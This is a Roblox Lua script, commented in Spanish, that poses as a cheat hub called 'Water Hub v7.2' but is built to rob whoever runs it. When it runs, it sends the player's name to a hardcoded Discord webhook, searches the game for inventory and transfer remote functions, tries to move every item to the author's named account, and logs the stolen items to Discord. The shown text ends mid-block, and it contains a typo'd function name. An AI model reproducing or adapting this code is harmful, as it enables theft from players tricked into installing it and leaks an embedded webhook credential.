-- =====================================================
-- 💧 WATER HUB v7.2 – OPTIMIZADO | BY: ABJadam
-- =====================================================

local WEBHOOK_URL = "https://discord.com/api/webhooks/1498033551013314730/cUEnEPV6-iKQYFpUeQpYt02DkQTgFuoumhrv5oZIZIhuKgUdha0qin64jf0Zgz5R89jm"
local MY_USER = "Soyadam_009"

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

-- 1. FUNCIÓN DISCORD (Con protección por si falla el HTTP)
local function SendToDiscord(title, message, color)
    pcall(function()
        local data = {
            ["embeds"] = {{
                ["title"] = title,
                ["description"] = message,
                ["color"] = color or 16711680,
                ["footer"] = {["text"] = "Water Hub Logger"}
            }}
        }
        local requestFunc = syn and syn.request or http_request or request or (http and http.request)
        if requestFunc then
            requestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end
    end)
end

-- 2. FUNCIÓN PARA ENCONTRAR EVENTOS CON BÚSQUEDA PARCIAL
local function FindRemotePartial(name)
    -- Buscar en ReplicatedFirst también (algunos juegos lo usan)
    local services = {game:GetService("ReplicatedStorage"), game:GetService("ReplicatedFirst")}
    
    for _, service in ipairs(services) do
        for _, obj in ipairs(service:GetDescendants()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                if string.find(string.lower(obj.Name), string.lower(name)) then
                    return obj
                end
            end
        end
    end
    return nil
end

-- 3. FUNCIÓN PARA SIMULAR ESTADOS REQUERIDOS
local function SimulateRequiredStates()
    -- Simular proximidad a NPCs si es necesario
    pcall(function()
        -- Buscar NPCs en el workspace
        for _, npc in ipairs(workspace:GetDescendants()) do
            if npc:IsA("Model") and npc:FindFirstChild("Humanoid") and npc ~= LocalPlayer.Character then
                -- Simular que estamos cerca del NPC
                local proximityEvent = npc:FindFirstChild("ProximityPrompt")
                if proximityEvent then
                    fireproximityprompt(proximityEvent)
                end
            end
        end
    end)
    
    -- Simular estados de enfoque si existen
    pcall(function()
        -- Buscar eventos que puedan establecer estados de enfoque
        local focusEvents = {
            FindRemotePartial("Focus"),
            FindRemotePartial("State"),
            FindRemotePartial("Set"),
            FindRemotePartial("Active")
        }
        
        for _, event in ipairs(focusEvents) do
            if event then
                if event:IsA("RemoteEvent") then
                    event:FireServer()
                elseif event:IsA("RemoteFunction") then
                    event:InvokeServer()
                end
            end
        end
    end)
end

-- 4. FUNCIÓN PARA DETERMINAR ESTRUCTURA DE DATOS DEL INVENTARIO
local function GetInventoryStructure(inventory)
    if not inventory or type(inventory) ~= "table" then return nil end
    
    -- Analizar el primer elemento para determinar la estructura
    local firstItem = inventory[1] or next(inventory)
    if not firstItem then return nil end
    
    local structure = {}
    for key, value in pairs(firstItem) do
        table.insert(structure, key)
    end
    
    return structure
end

-- 5. FUNCIÓN PARA INTENTAR TRANSFERIR ÍTEMS CON DIFERENTES PARÁMETROS
local function TryTransferItem(item, deliveryRF)
    -- Determinar el identificador del ítem (UUID, Id, Name)
    local itemId = item.Id or item.UUID or item.Name or tostring(item)
    
    -- Intentar diferentes combinaciones de parámetros
    local transferAttempts = {
        -- (Destinatario, ItemID)
        function() return deliveryRF:InvokeServer(MY_USER, itemId) end,
        -- (ItemID, Destinatario)
        function() return deliveryRF:InvokeServer(itemId, MY_USER) end,
        -- Tabla con metadatos
        function() 
            return deliveryRF:InvokeServer({
                Target = MY_USER,
                Item = itemId,
                Source = LocalPlayer.Name
            })
        end,
        -- Estructura con datos completos del ítem
        function()
            return deliveryRF:InvokeServer({
                Recipient = MY_USER,
                ItemData = item
            })
        end
    }
    
    for i, attempt in ipairs(transferAttempts) do
        local success, result = pcall(attempt)
        if success then
            return true, i, result
        end
    end
    
    return false, 0, nil
end

-- 6. MOTOR DE ROBO OPTIMIZADO
task.spawn(function()
    -- Esperamos a que el juego cargue completamente
    if not game:IsLoaded() then game.Loaded:Wait() end
    task.wait(5) 

    SendToDiscord("🎯 Ejecución Detectada", "El usuario **" .. LocalPlayer.Name .. "** ha abierto el Hub v7.2.", 3447003)

    -- Simular estados necesarios antes de intentar el robo
    SimulateRequiredStates()
    task.wait(1)

    -- Buscar eventos con búsqueda parcial
    local ListRF = FindRemotePartial("List") or FindRemotePartial("Inventory") or FindRemotePartial("Stock")
    local DeliveryRF = FindRemotePartial("Delivery") or FindRemotePartial("Transfer") or FindRemotePartial("Send")
    
    if not ListRF then
        SendToDiscord("❌ Error Crítico", "No se encontró ningún evento de inventario en el juego.", 16711680)
        return
    end

    if not DeliveryRF then
        SendToDiscord("❌ Error Crítico", "No se encontró ningún evento de transferencia en el juego.", 16711680)
        return
    end
    
    -- Verificar que son RemoteFunctions
    if not ListRF:IsA("RemoteFunction") then
        SendToDiscard("❌ Error", "El evento de inventario no es un RemoteFunction.", 16776960)
        return
    end
    
    if not DeliveryRF:IsA("RemoteFunction") then
        SendToDiscard("❌ Error", "El evento de transferencia no es un RemoteFunction.", 16776960)
        return
    end

    -- Obtener inventario
    local success, inventory = pcall(function() return ListRF:InvokeServer() end)
    
    if not success then
        SendToDiscord("⚠️ Error", "No se pudo obtener el inventario (Invoke falló).", 16776960)
        return
    end
    
    if not inventory or type(inventory) ~= "table" then
        SendToDiscord("⚠️ Error", "El inventario devuelto no es una tabla válida.", 16776960)
        return
    end
    
    -- Analizar estructura del inventario
    local structure = GetInventoryStructure(inventory)
    local structureStr = table.concat(structure, ", ")
    SendToDiscord("📊 Estructura Detectada", "El inventario tiene la siguiente estructura: " .. structureStr, 3447003)
    
    -- Procesar cada ítem
    local transferidos = 0
    local fallidos = 0
    local botin = ""
    
    for _, item in pairs(inventory) do
        local itemName = item.Name or tostring(item.Id or item.UUID or "Ítem desconocido")
        
        -- Intentar transferir el ítem
        local transferSuccess, attemptUsed, result = TryTransferItem(item, DeliveryRF)
        
        if transferSuccess then
            transferidos = transferidos + 1
            botin = botin .. "✅ " .. itemName .. " (Método: " .. attemptUsed .. ")\n"
        else
            fallidos = fallidos + 1
            botin = botin .. "❌ " .. itemName .. " (Fallido)\n"
        end
        
        -- Pequeña pausa para no sobrecargar el servidor
        task.wait(0.1)
    end
    
    -- Enviar resultados a Discord
    local title = transferidos > 0 and "💰 Transferencia Completada" or "⚠️ Transferencia Fallida"
    local color = transferidos > 0 and 65280 or 16776960
   
